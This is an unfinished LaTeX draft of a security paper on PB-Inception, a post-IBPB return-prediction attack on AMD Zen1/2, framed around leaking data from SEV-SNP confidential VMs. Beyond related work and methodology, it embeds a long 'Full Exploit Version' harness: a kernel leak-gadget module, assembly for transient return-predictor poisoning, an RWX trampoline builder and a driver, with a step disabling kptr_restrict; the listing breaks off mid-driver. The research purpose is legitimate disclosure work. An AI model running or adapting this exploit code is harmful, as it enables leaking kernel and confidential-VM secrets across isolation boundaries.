\documentclass[11pt,a4paper]{article}
\usepackage[margin=3cm]{geometry}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{microtype}
\usepackage{hyperref}
\usepackage{booktabs}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{amsmath}
\usepackage{graphicx}
\lstset{
    basicstyle=\ttfamily\small,
    columns=fullflexible,
    keepspaces=true,
    frame=single,
    breaklines=true,
    showstringspaces=false,
    tabsize=4,
    language={[x86masm]Assembler},
    captionpos=b
}

% Tell listings what NASM looks like
\lstdefinelanguage{nasm}{
  keywords      = {section,global,call,ret,loop,align},
  morekeywords  = {mov,lea,push,shl,int3},   % =\lstkeywordstyle
  ndkeywords    = {rax,rcx,rdi,rip,al},      % registers, =\lstndkeywordstyle
  comment       = [l]{;},                    % ; starts a comment
  sensitive     = true
}

% Define a style for bash listings
\lstdefinestyle{bash-nonitalic}{
  language=bash,
  basicstyle=\ttfamily\small,
  commentstyle=\ttfamily\color{gray},  % <- not italic
  keywordstyle=\color{blue},
  showstringspaces=false,
  breaklines=true
}

% Global style: tweak as you wish
\lstset{
  language         = nasm,
  basicstyle       = \ttfamily\footnotesize,
  keywordstyle     = \color{blue!70!black}\bfseries,
  ndkeywordstyle   = \color{teal!70!black},
  commentstyle     = \color{gray}\itshape,
  stringstyle      = \color{orange!80!black},
  numbers          = left,
  numberstyle      = \tiny\color{gray},
  frame            = tb,          % top+bottom rule
  backgroundcolor  = \color{black!2},
  columns          = fullflexible,
  tabsize          = 4,
}

\title{A practical PB Inception Attack and Implications for Confidential Computing}
\author{Kaya Ercihan, Jonathan MÃ¼ller}
\date{23.12.2025}

\begin{document}
\bibliographystyle{IEEEtranS}  % IEEE, sorted
\maketitle

% ##############################################################################################
% 
%   Structure of documentation
% 
% ##############################################################################################
%\section{Intoduction}
%\section{Related Work}
%\subsection{Contribution} %
%\section{Methodology}
%\section{Experiments}
%\section{Results and Discussion}
%\section{Future Work}
%\section{Conclusion}
%\section{Appendix}

\section*{Abstract}
ToDo

\section{Intoduction}
ToDo
\subsection{Use Case: Confidential Computing}
Confidential computing encrypts memory (including instructions and data) using keys managed by the AMD Secure Processor (ASP). Secure Encrypted Virtualization (SEV) encrypts the entire VM memory, so instructions and data remain encrypted while stored in RAM. Only the CPU decrypts them on-the-fly during execution.

SEV-SNP adds integrity protection, ensuring that the hypervisor cannot tamper with or remap the VM's memory. This prevents attacks like memory snooping or VM breakout, even from a compromised hypervisor.

The ASP manages the encryption keys and secure context but does not perform decryption itself. Instead, decryption happens within the CPU, tightly integrated into the memory controller and instruction pipeline. Therefore, memory remains encrypted at rest and in transit, and is only decrypted in the CPU, for the correct VM.
\clearpage

\section{Related Work}
\label{sec:related}

\paragraph{Speculative execution and Spectre lineage.} Modern out-of-order processors predict control flow to keep pipelines full, enabling transient execution along mispredicted paths. The Spectre family formalized practical exploitation of such mispredictions and showed cross-domain leaks via microarchitectural side channels \cite{kocher2018spectre}. Since then, a broad line of work has mapped and exploited branch-prediction structures (PHT/BTB/RSB) across privilege and context boundaries.

\paragraph{RSB- and return-centric attacks.}
Early RSB-focused works (SpectreRSB and ret2spec) showed how return-target prediction can be subverted even without direct control over indirect branches \cite{koruyeh2018spectrersb,maisuradze2018ret2spec}. RETbleed systematized cross-privilege return hijacking and demonstrated end-to-end leaks on AMD and Intel by steering returns via BTB collisions; it also evaluated practical kernel mitigations (e.g. \texttt{jmp2ret}, RSB clearing/stuffing, and retpoline interactions) \cite{wikner2022retbleed}.

\paragraph{AMD Zen microarchitectures, BTC, and early speculation.}
On AMD Zen, Branch Type Confusion (BTC) and PHANTOM speculation reveal that prediction can occur very early in the frontend, including on non-branch instructions, increasing attack surface and interacting with return prediction \cite{amd2022btc,wikner2023phantom}. AMD introduced controls like \texttt{SuppressBPOnNonBr} and guidance for managing speculation across Zen generations \cite{amd2022btc,amd_software_spec}.

\paragraph{INCEPTION / SRSO.}
\emph{INCEPTION} (a.k.a.\ Speculative Return Stack Overflow, SRSO, CVE-2023-20569) shows that attackers can inject return predictions, creating long transient windows to disclose kernel data on all AMD Zen generations, despite deployed defenses \cite{trujillo2023inception,nvd_cve_2023_20569,amd_sb7005,linux_srso_doc}. Vendor whitepapers and kernel documentation discuss mitigations (IBPB-on-entry, RSB stuffing, untrained returns), trade-offs, and microcode dependencies on different Zen generations \cite{amd_srso_whitepaper,linux_srso_doc}.

\paragraph{IBPB, post-barrier speculation, and PB-Inception.}
A central defense for cross-context Spectre-BTI is the Indirect Branch Predictor Barrier (IBPB). However, the correctness of IBPB relies on microcode semantics and how software applies it. Recent analysis shows that IBPB does not fully flush all alternate return predictors. For Intel Golden/Raptor Cove, PB-RRSBA enables stale IP-based return predictions post-IBPB; for AMD Zen1(+)/Zen2, IBPB-on-entry still leaves the return predictor retaining poisoned entries learned just before the barrier, enabling PB-Inception to leak arbitrary kernel memory \cite{wikner2025breaking}. The work proposes disabling exploitable RRSBA predictions via a chicken bit on affected Intel CPUs, and hardening Linux on AMD by stuffing the RSB when using IBPB-on-entry to prevent post-barrier return hijacks \cite{wikner2025breaking}. These findings connect to earlier vendor advisories on post-barrier return prediction (PBRSB) and RRSBA enumeration/mitigation \cite{intel_pbrsb,intel_rrsba}.

\paragraph{System response and current practice.}
Linux now documents SRSO/RSB mitigations (IBPB strategies, untrained returns, RSB stuffing and conditions for applying them) and their performance-security tradeoffs. The effectiveness varies by microarchitecture and available microcode \cite{linux_srso_doc,linux_rsb_doc}. On AMD Zen3/4, IBPB may flush IP-based predictors to mitigate INCEPTION-like behaviors, while Zen1/2 require software RSB stuffing on entry when IBPB is used \cite{wikner2025breaking,amd_srso_whitepaper}.

\paragraph{Takeaway.}
For AMD Zen, the return predictor remains a privileged choke point: pre-barrier mistraining plus post-barrier retention under specific IBPB configurations yields PB-Inception-style cross-privilege leaks. Comprehensive defenses require both correct barrier semantics in microcode \emph{and} software-side RSB sanitization at the right points in the control-flow transitions \cite{wikner2025breaking,trujillo2023inception,linux_srso_doc}.

\section{Contribution}
ToDo

\section{Methodology}

\paragraph{Goal.}
Demonstrate a post-IBPB Spectre primitive on AMD Family Zen~1(+)/2 whereby return-target predictions, mistrained before an IBPB, survive the barrier and steer the first ret in the kernel entry path to a chosen leak gadget (PB-Inception). We further instantiate the primitive in a Confidential Computing (CC) setting (AMD SEV-SNP) by exfiltrating secrets into an unencrypted shared buffer (C-bit=0) observable by the host.

\paragraph{Threat model.}
An unprivileged attacker process (inside a Linux guest) aims to infer kernel-resident data across a user$\rightarrow$kernel boundary that issues IBPB-on-entry. The attacker controls userland code and can load a benign kernel module in the guest for experimental instrumentation. The host is passive and only performs measurements on a shared buffer. No architectural faults or privilege escalations are used.

\paragraph{Preconditions.}
(i) AMD Family~17h (Zen~1/2) where return-target predictions persist across IBPB; (ii) the Linux entry path executes entry\_ibpb (wrmsr to IBPB) and then performs an early ret; (iii) a kernel leak gadget reachable under speculative control, producing a cache-disclosed signal; (iv) CC flags present (SEV/SEV-ES/SEV-SNP) and availability of a guest page with C-bit cleared to act as a host-observable probe.%

The flags can under Linux be found with the command \texttt{lscpu} by checking the advertised flags "SEV", "SEV-ES", "SEV-SNP" in the following way:
\begin{lstlisting}[language=bash]
Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
Address sizes:       48 bits physical, 48 bits virtual
CPU(s):              8
On-line CPU(s) list: 0-7
Thread(s) per core:  2
Core(s) per socket:  4
Socket(s):           1
NUMA node(s):        1
Vendor ID:           AuthenticAMD
CPU family:          25
Model:               1
Model name:          AMD EPYC 7B13
Stepping:            0
CPU MHz:             3049.994
BogoMIPS:            6099.98
Virtualization:      AMD-V
L1d cache:           32K
L1i cache:           32K
L2 cache:            512K
L3 cache:            16M

Flags:
fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov 
pat pse36 clflush mmx fxsr sse sse2 ht syscall nx mmxext fxsr_opt 
pdpe1gb rdtscp lm constant_tsc rep_good nopl nonstop_tsc cpuid 
extd_apicid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid 
sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand 
hypervisor lahf_lm cmp_legacy cr8_legacy abm sse4a misalignsse 
3dnowprefetch osvw topoext invpcid_single ssbd ibrs ibpb stibp 
vmmcall fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid 
rdseed adx smap clflushopt clwb sha_ni xsaveopt xsaves xgetbv1 
clzero xsaveerptr arat npt nrip_save umip vaes sev sev-es sev-snp
\end{lstlisting}

\subsubsection{Overview of the exploit flow}
\label{sec:method:pb-inception:overview}
PB-Inception proceeds in three phases:

\begin{enumerate}
  \item \textbf{Pre-IBPB transient training (user mode).} We execute a transient-only call cascade to poison return predictions with addresses that alias a chosen kernel gadget. The cascade is \emph{Training-in-Transient-Execution} (TTE): a mispredicted backward \texttt{Jcc} keeps the predicate unresolved while a sequence of 64 \texttt{call}-sites (\texttt{TRAMP\_COUNT}) issues \emph{speculative} \texttt{CALL}s. None of these calls retire architecturally, they only push return addresses into the return predictor. A deliberately ``slow'' load on the branch predicate (mapped cold memory) widens the speculation window.
  \item \textbf{Crossing the IBPB boundary.} We invoke a system call (getpid) so the kernel executes \texttt{entry\_ibpb} early in the entry path (wrmsr to IBPB) and then performs the first post-IBPB \texttt{ret}. Because return-target predictions persist across IBPB on Zen1/2, that \texttt{ret} speculatively follows our poisoned predictions.
  \item \textbf{Speculative leak and recovery.} The mispredicted return lands in a kernel \emph{data-cache (DC) leak gadget} that loads one byte from a chosen kernel virtual address and encodes it as a cache footprint at offset \texttt{val\,$\ll$\,12} in a 1\,MiB probe buffer. The probe buffer is mapped in the guest but backed by guest-physical memory with C-bit=0 and \emph{also} ioremapped cached in the kernel, so the host can recover the byte via Flush+Reload.
\end{enumerate}

\subsubsection{Implementation details (as used in our harness)}
\label{sec:method:pb-inception:impl}

\paragraph{Kernel gadget LKM.}
We load a minimal LKM that exports \texttt{pbinc\_dc\_gadget()} and wires three sysfs controls under \texttt{/sys/kernel/pbinc/}: (i) \texttt{probe} (guest-physical base of the shared 1\,MiB probe, ioremapped with \texttt{ioremap\_cache()}), (ii) \texttt{leak} (kernel VA to read the secret byte), and (iii) \texttt{gaddr} (the gadget's kernel VA for alias matching). The gadget performs:
\[
\text{\texttt{val = *leak\_source\_va;\quad writeb(1, probe\_kva + (val << 12));}}
\]
which yields a strong Flush+Reload signal while keeping the architectural path benign.


\paragraph{Return-address aliasing trampolines.}
To bias the return predictor toward \texttt{pbinc\_dc\_gadget}, we JIT-build executable \emph{trampolines} whose \emph{return addresses} (the instruction immediately after a call) share the same low-bit alias class as the gadget (\texttt{ALIAS\_MASK = 0xFFFFF}). We scan an RX region to place 64 trampolines whose post-call RAs satisfy
\[
(\texttt{RA} \ \&\ \texttt{ALIAS\_MASK}) = (\texttt{gaddr} \ \&\ \texttt{ALIAS\_MASK}),
\]
and store their entry pointers in \texttt{\_\_alias\_tbl[64]}.

\paragraph{TTE call cascade.}
User-mode assembly \texttt{pbinc\_entry} executes:
\begin{enumerate}
  \item a forward jump to skip the cascade architecturally
  \item a backward jump \texttt{JE} whose condition is delayed via a load from \texttt{\_\_slow\_predicate\_ptr};
  \item in the mispredicted path, a loop of 64 call instructions, each through \texttt{\_\_alias\_tbl[i]}, pushing colliding RAs and overflowing return prediction state
  \item a \texttt{syscall} to \texttt{getpid} (triggers entry-IBPB).
\end{enumerate}
The cascade is arranged so no call retires, it only perturbs return predictions.

\paragraph{Crossing IBPB and hijacking the first return.}
Linux enters the kernel, executes \texttt{entry\_ibpb} (wrmsr to IBPB), then returns into the regular entry path. On AMD Zen1/2, IBPB does not invalidate return-target predictions; hence the first \texttt{ret} post-IBPB speculates to our gadget. We intentionally target a very early return in the entry path (before stack randomization) to maximize stability and cache-control over the speculation window.

\paragraph{Covert channel and measurement.}
The host (or a separate monitoring thread) performs Flush+Reload over the 1\,MiB probe (256 pages at 4\,KiB spacing). Each speculative byte sets exactly one page hot at offset \texttt{val\,$\ll$\,12}. For runs under SEV-SNP, we allocate the probe page(s) as shared (C-bit=0) and pass the guest-physical base to the LKM via \texttt{/sys/kernel/pbinc/probe}. This preserves the CC threat model while allowing the host to measure cache state.

\subsubsection{Confidential Computing context (SEV-SNP)}
\label{sec:method:pb-inception:cc}
We verify CC availability with \texttt{lscpu} flags \texttt{sev}, \texttt{sev-es}, and \texttt{sev-snp}. For leakage, the probe buffer must be \emph{unencrypted} (C-bit=0) so that a host Flush+Reload can observe the signal while the victim code and kernel data remain protected at rest. The core mechanism remains speculative and in-core: decrypted instructions/data are processed transiently even under SEV-SNP, and microarchitectural footprints on shared memory are observable.

\subsubsection{Controls and validation}
\label{sec:method:pb-inception:controls}
We validate causality with the following A/B toggles:
\begin{itemize}
  \item \textbf{Mitigation toggle:} disable IBPB-on-entry or add full RSB stuffing at kernel entry $\Rightarrow$ signal vanishes.
  \item \textbf{Gadget toggle:} unload the LKM or point \texttt{leak} to an unmapped address $\Rightarrow$ no hits.
  \item \textbf{Aliasing toggle:} randomize \texttt{ALIAS\_MASK} or build zero trampolines $\Rightarrow$ no hijack.
  \item \textbf{Microarchitecture toggle:} run on non-Zen1/2 AMD or Intel $\Rightarrow$ negative (as expected for PB-Inception).
  \item \textbf{Performance counters:} observe elevated branch-miss and machine-clear events during active runs.
\end{itemize}

\subsubsection{Assumptions, limitations, and ethics}
\label{sec:method:pb-inception:limits}
PB-Inception relies on (i) persistence of return-target predictions across IBPB on AMD Zen1/2, (ii) an early \texttt{ret} after \texttt{entry\_ibpb}, and (iii) availability of a kernel leak gadget. Systems that untrain/stuff the RSB on entry, remove early returns, or alter IBPB application semantics invalidate the preconditions.

\subsubsection{Reproducibility checklist}
\label{sec:method:pb-inception:repro}
\begin{enumerate}
  \item Pin attacker to a single core; record \texttt{/sys/devices/system/cpu/vulnerabilities/spectre\_v2}.
  \item Build and insert the LKM; provision \texttt{probe} (GPA of C-bit=0 buffer), \texttt{leak} (KVA), and read \texttt{gaddr}.
  \item Build user binary with trampolines (64 entries, \texttt{ALIAS\_MASK} tuned to the gadget).
  \item Run \texttt{pbinc\_poc} and start host Flush+Reload over the 1\,MiB probe.
  \item Collect latency histograms. Confirm single-page hits at offsets \texttt{val\,$\ll$\,12}; execute controls in~\S\ref{sec:method:pb-inception:controls}.
\end{enumerate}

\section{Experiments}
ToDo

\section{Results and Discussion}
ToDo
\begin{lstlisting}[language=bash, alsolanguage=C]
#!/usr/bin/env bash
# PB-Inception (Post-IBPB) Measurement Harness -> Full Exploit Version
# -----------------------------------------------------------------------------
# Builds/loads the kernel gadget (LKM), compiles the user-space binary
# (ASM + trampoline builder + driver + flush+reload), wires sysfs,
# and launches the PoC pinned to one core on an AMD Zen system.
# -----------------------------------------------------------------------------

set -euo pipefail

################################# configuration knobs

WORKDIR="${PWD}/pbinc_lab"
KMOD_DIR="${WORKDIR}/kmod"
USER_DIR="${WORKDIR}/user"

TRAMP_COUNT=64          # depth for speculative CALLs / number of trampolines
ALIAS_MASK="0xFFFFF"    # low-bit alias mask to match kernel gadget class (tune/spray)

CPU_CORE=${CPU_CORE:-0} # pin PoC to a core for stability
NASM=${NASM:-nasm}
CC=${CC:-gcc}
MAKE=${MAKE:-make}

################################# helpers

need_cmd() { command -v "$1" >/dev/null 2>&1 || { echo "[-] Need $1 installed"; exit 1; }; }
warn()     { echo "[-] $*" >&2; }
info()     { echo "[*] $*"; }
ok()       { echo "[+] $*"; }
sudo_or()  { if [[ $EUID -ne 0 ]]; then sudo "$@"; else "$@"; fi; }

################################# preflight

info "Checking toolchain"
need_cmd "$CC"; need_cmd "$MAKE"; need_cmd "$NASM"
if command -v apt-get >/dev/null 2>&1; then
  command -v perf >/dev/null 2>&1 || sudo_or apt-get install -y linux-tools-common linux-tools-$(uname -r) || true
fi

info "CPU sanity (expect AMD Zen 1/2)"
lscpu | egrep 'Vendor ID|CPU family|Model name' || true
lscpu | grep -qi 'AuthenticAMD' || warn "CPU vendor not AMD - results may be negative"
lscpu | egrep -qi 'family\s*:\s*17|CPU family:\s*17' || warn "CPU family not 17h (Zen1/2) - results may be negative"

info "Mitigation telemetry (guest should perform entry-IBPB)"

[[ -r /sys/devices/system/cpu/vulnerabilities/spectre_v2 ]] && cat /sys/devices/system/cpu/vulnerabilities/spectre_v2 || warn "Cannot read spectre_v2"
sysctl kernel.kptr_restrict 2>/dev/null | grep -q ' = 0' || warn "kptr_restrict != 0 (set: sudo sysctl -w kernel.kptr_restrict=0)"

################################# workspace

info "Creating workspace at ${WORKDIR}"
rm -rf "$WORKDIR"; mkdir -p "$KMOD_DIR" "$USER_DIR"

################################# kernel module

echo "[*] Writing kernel gadget source"
cat > "${KMOD_DIR}/pbinc_gadget.c" << 'EOF'
#include <linux/module.h>
#include <linux/io.h>
#include <linux/sysfs.h>

#define PROBE_SIZE (4096 * 256)

// Mapped kernel VA of the SHARED buffer (mapped via ioremap_cache())
static void __iomem *probe_kva = NULL;

// Physical address of the SHARED buffer (set by user via sysfs)
static phys_addr_t probe_pa = 0;

// Kernel virtual address to read the leaked byte from (set via sysfs)
static void *leak_source_va = NULL;

// PB-Inception Data Cache (DC) Gadget
// Speculatively executed via mispredicted RET
// Loads 1 byte from kernel address (leak_source_va) and
// encodes it into the SHARED probe buffer at [val << 12]
noinline notrace void pbinc_dc_gadget(void)
{
    if (!probe_kva || !leak_source_va)
        return;
    
    // Load the secret byte (must be mapped and readable)
    u8 val = *(volatile u8 *)leak_source_va;
    
    // Encode it into the SHARED probe buffer at offset: val * 4096
    writeb(1, probe_kva + ((size_t)val << 12));
}
EXPORT_SYMBOL_GPL(pbinc_dc_gadget); // Make the gadget address visible via kallsyms/sysfs

// Sets the physical address of the 1 MiB SHARED buffer
// Maps it with ioremap_cache() so the gadget can access it
static ssize_t probe_pa_store(struct kobject *kobj, struct kobj_attribute *attr,
                              const char *buf, size_t count)
{
    kstrtoull(buf, 0, &probe_pa);
    
    // Unmap old region if previously mapped
    if (probe_kva) iounmap(probe_kva);

    // Map the shared physical buffer into kernel VA space
    probe_kva = ioremap_cache(probe_pa, PROBE_SIZE);
    return count;
}

// Sets the virtual address inside the kernel to leak from
// The gadget will read 1 byte from this address transiently
static ssize_t leak_va_store(struct kobject *kobj, struct kobj_attribute *attr,
                             const char *buf, size_t count)
{
    unsigned long tmp;
    kstrtoul(buf, 0, &tmp);
    leak_source_va = (void *)tmp;
    return count;
}

// Returns the virtual address of pbinc_dc_gadget()
// Userland uses this to match low bits for return predictor aliasing
static ssize_t gaddr_show(struct kobject *kobj, struct kobj_attribute *attr, char *buf)
{
    return sprintf(buf, "%px\\n", pbinc_dc_gadget);
}

// Each entry connects a sysfs file to a store/show function
static struct kobj_attribute attr_probe_pa = __ATTR(probe, 0200, NULL, probe_pa_store);
static struct kobj_attribute attr_leak_va  = __ATTR(leak,  0200, NULL, leak_va_store);
static struct kobj_attribute attr_gaddr    = __ATTR(gaddr, 0444, gaddr_show, NULL);

// Group of sysfs attributes under /sys/kernel/pbinc/
static struct attribute *attrs[] = {
    &attr_probe_pa.attr,
    &attr_leak_va.attr,
    &attr_gaddr.attr,
    NULL,
};

// Module cleanup: unmap shared memory and remove sysfs files
static const struct attribute_group attr_group = {
    .attrs = attrs,
};

static struct kobject *kobj;

static int __init pbinc_init(void)
{
    kobj = kobject_create_and_add("pbinc", kernel_kobj);
    return sysfs_create_group(kobj, &attr_group);
}

static void __exit pbinc_exit(void)
{
    if (probe_kva) iounmap(probe_kva);
    kobject_put(kobj);
}

module_init(pbinc_init);
module_exit(pbinc_exit);
MODULE_LICENSE("GPL");
EOF

cat > "${KMOD_DIR}/Makefile" <<'EOF'
obj-m += pbinc_gadget.o
all:   ; $(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean: ; $(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

info "Building & loading kernel module"
( cd "${KMOD_DIR}" && $MAKE -j )
sudo_or insmod "${KMOD_DIR}/pbinc_gadget.ko" || { sudo_or rmmod pbinc_gadget 2>/dev/null || true; sudo_or insmod "${KMOD_DIR}/pbinc_gadget.ko"; }
ls -l /sys/kernel/pbinc/{probe,gaddr}

################################# user sources

info "Writing user ASM (pre-IBPB transient training) - pbinc.asm"
cat > "${USER_DIR}/pbinc.asm" <<'EOF'
global pbinc_entry
extern __pbinc_kernel_gadget_addr     ; From C driver: patched with KVA of kernel gadget
extern __pbinc_probe_shared           ; From C driver: VA of shared probe buffer (1MB)
extern __alias_tbl                    ; Runtime-patched: array of 64 callsite trampoline entry pointers
extern __slow_predicate_ptr           ; Runtime: mapped slow memory (used to delay JE resolution)

section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Entry point for the PB-Inception userland training harness
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
pbinc_entry:
    call pre_ibpb_transient_train   ;Run transient training before IBPB
    mov  rax, 39                    ; getpid -> syscall entry (IBPB boundary)
    syscall                         ; Cross IBPB boundary (causes entry-IBPB in guest)
.spin:
    pause                           ; Not kill threat -> inf loop -> keep-alive threat
    jmp  .spin

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Pre-IBPB transient training block
; - Uses a backward mispredicted JE to speculatively execute call cascade
; - No call here retires (training must be transient-only)
; => 64 calls -> return predictor pressure
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
pre_ibpb_transient_train:
    jmp  .do_branch                ; Skip call cascade architecturally (forward jump)
                                   ; Under normal (architectural) execution, the call cascade never runs
                                   ; Means if the "normal" paths are taken it wouldnt run

.speculative_call_cascade:
    mov  rsi, [rel __alias_tbl]    ; Load pointer to trampoline entry array (call sites)
    mov  ecx, 64                   ; Number of transient call targets
.alias_loop:
    call qword [rsi]               ; Speculative CALL -> pushes RA to stack -> biases return predictor
    add  rsi, 8                    ; Trampolines are crafted to have return addresses that alias the kernel gadget
    dec  ecx                       ; Advance to next entry in trampoline table
    jnz  .alias_loop               ; Loop until all 64 calls are issued -> until z-flag not 0
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Branch predicate that keeps JE unresolved long enough to execute the cascade
; - Must not use lfence -> all memory loads before lfence must complete -> not speculatively run anymore
; - The memory at __slow_predicate_ptr should be slow (uncached / fault-suppressed / mapped to delay)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.do_branch:
    mov  rdx, [rel __slow_predicate_ptr]  ; runtime: slow mapped memory
    mov  rax, [rdx]
    cmp  rax, 0xdeadbeef
    je   .speculative_call_cascade        ; backward Jcc (target above)
    ret

section .data
__pbinc_kernel_gadget_addr: dq 0           ; Patched at runtime: VA of kernel gadget (used to derive alias class)
__pbinc_probe_shared:       dq 0           ; Patched at runtime: guest VA of SHARED probe buffer (1 MiB)
__alias_tbl:                times 64 dq 0  ; Table of 64 trampoline entry VAs (callsite-aligned, RA aliasing gadget)
__slow_predicate_ptr:       dq 0           ; Points to mapped slow memory to delay JE resolution
; Slow memory because: Because we want the CPU to speculate into the training block before it knows whether the branch
; is actually taken or not.
EOF

info "Writing trampoline builder (CALLSITE trampolines; RA aliasing) -> trampoline.c"
cat > "${USER_DIR}/trampoline.c" <<EOF
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <errno.h>

// Trampoline because: A small piece of code whose only purpose
// is to jump or call into another piece of code -> often while
// managing control flow

// Total number of desired trampolines for return-predictor pressure
#define TRAMPOLINE_COUNT ${TRAMP_COUNT}

// Max number of slots we'll scan to find alias-matching trampolines
#define MAX_SEARCH_ATTEMPTS 4096

// System page size (used to calculate region allocation)
#define PAGE_SIZE 4096

// Size of memory to mmap for trampoline stubs
#define REGION_SIZE (PAGE_SIZE * MAX_SEARCH_ATTEMPTS)

// x86 opcodes
#define RET_OPCODE 0xC3   // ret
#define CALL_OPCODE 0xE8  // call rel32

// Externals patched/shared across PoC
extern uint64_t __pbinc_kernel_gadget_addr;    // Kernel gadget VA
extern uint64_t __alias_tbl[TRAMPOLINE_COUNT]; // Trampoline callsite entry points

// Allow override of alias mask (used to match gadget RA bits)
#ifndef ALIAS_MASK
#define ALIAS_MASK ${ALIAS_MASK}UL // Mask used to match low bits of return address
#endif

////////////////////////////////////////////////////////////////////////////////
// Builds a set of trampolines (CALLSITE stubs) where the return address
// (i.e. the address after the CALL) falls in the same predictor class
// as the kernel gadget. This is the key to PB-Inception predictor pressure.
////////////////////////////////////////////////////////////////////////////////
void *pbinc_create_trampolines(uint64_t gadget_addr) {
    // Allocate RWX memory region for executable trampolines
    uint8_t *region = mmap(NULL, REGION_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC,
                           MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) {
        perror("mmap"); exit(1); // Bail if mapping fails
    }

    int found = 0; // Track how many aliasing trampolines we found
    for (int i = 0; i < REGION_SIZE - 16 && found < TRAMPOLINE_COUNT; i += 64) {
        uint8_t *tramp = region + i;

        // Compute return address after the call instruction (i.e. target of first RET)
        uint64_t ra = (uint64_t)(tramp + 5);                    // return address after CALL
        
        ////////////////////////////////////////////////////////////////////////////////
        // Return address (RA) = address immediately after the CALL
        // This is the address the CPU will speculate toward when a RET occurs
        //
        // The return predictor (e.g., RSB or BTB) doesn't use full 64-bit VAs.
        // Instead, it indexes using a hash or the low N bits (-> 12-20 bits).
        //
        // The goal is to make RA collide with the kernel gadget's predictor slot,
        // so that speculative RETs in the kernel (post-IBPB) will transiently
        // jump to the gadget -> even though architecturally they shouldn't.
        //
        // Therefore, we apply an ALIAS_MASK to both:
        // ra & ALIAS_MASK -> the return address from the trampoline
        // gadget_addr & ALIAS_MASK -> the address of our kernel gadget
        //
        // If they match: the predictor learns that return addresses in this
        // index class are likely -> this builds pressure toward the gadget.
        //
        // If they don't match: skip this candidate.
        ////////////////////////////////////////////////////////////////////////////////

        if ((ra & ALIAS_MASK) != (gadget_addr & ALIAS_MASK))
            continue;

        tramp[0] = CALL_OPCODE;       // call rel32 (relative target -> 32-bit signed offset) -> ret_stub @ +6
        *(int32_t *)(tramp + 1) = (int32_t)((tramp + 6) - (tramp + 5)); // Calculate rel32 offset for call
        tramp[5] = RET_OPCODE;        // First RET -> returns to RA (alias)
        tramp[6] = RET_OPCODE;        // ret_stub: return to next alias
        tramp[7] = RET_OPCODE;        //Optional RET padding (safe NOP)

        __alias_tbl[found++] = (uint64_t)tramp;   // Save entry point into alias table
    }

    // If we couldn't build enough valid trampolines, exit
    if (found < TRAMPOLINE_COUNT) {
        fprintf(stderr, "[-] Only %d/%d trampolines matched mask 0x%lx (gadget bits 0x%lx)\n",
                found, TRAMPOLINE_COUNT, (unsigned long)ALIAS_MASK,
                (unsigned long)(__pbinc_kernel_gadget_addr & ALIAS_MASK));
        exit(1);
    }
    printf("[+] Built %d trampolines; alias mask 0x%lx\n", found, (unsigned long)ALIAS_MASK);
    return region; // keep region mapped/executable
}
EOF

info "Writing driver to wire sysfs -> trampolines -> ASM entry - driver.c"
cat > "${USER_DIR}/driver.c" <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sched.h> // For CPU pinning
#include <unistd.h>
#include <errno.h>

#define TRAMPOLINE_COUNT 64 // Number of speculative callsite trampolines

// Extern symbols from the ASM file and trampoline builder
extern uint64_t __pbinc_kernel_gadget_addr;    // Kernel gadget VA (to alias against)
extern uint64_t __pbinc_probe_shared;          // SHARED (C-bit=0) buffer (host-observable)
extern uint64_t __alias_tbl[TRAMPOLINE_COUNT]; // Callsite trampoline table (filled at runtime)
extern uint64_t __slow_predicate_ptr;          // Cold memory to delay branch resolution

// Provided by trampoline.c -> builds the aliasing callsite trampolines
void *pbinc_create_trampolines(uint64_t gadget_addr);

// Provided by pbinc.asm -> the speculative training -> syscall -> spin harness
void pbinc_entry(void);

// Reads a hex value from a sysfs-style file (e.g. /sys/kernel/pbinc/gaddr)
static uint64_t read_hex(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) { 
        perror(path); exit(1); // Abort if file can't be opened
    }
    unsigned long long x = 0;
    if (fscanf(f, "%llx", &x) != 1) {
        fprintf(stderr, "parse %s failed\n", path); exit(1); // Failed to parse hex
    }
    fclose(f);
    return x; // Return parsed 64-bit value
}

int main(int argc, char **argv) {
    if (argc < 2) {
        // Expect SHARED buffer guest-virtual address (GVA) as argument
        fprintf(stderr, "usage: %s <guest-VA-of-SHARED-probe-hex>\n", argv[0]);
        return 2;
    }

    ////////////////////////////////////////////
    // 1. Pin to specific CPU core -> stability
    ////////////////////////////////////////////
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set); // Enforce CPU affinity for PoC repeatability

    ////////////////////////////////////////////
    // 2. Patch runtime addresses from sysfs / CLI
    ////////////////////////////////////////////
    // Load kernel gadget virtual address from module sysfs (e.g. /sys/kernel/pbinc/gaddr)
    __pbinc_kernel_gadget_addr = read_hex("/sys/kernel/pbinc/gaddr");

    // Parse GVA of shared probe from command-line
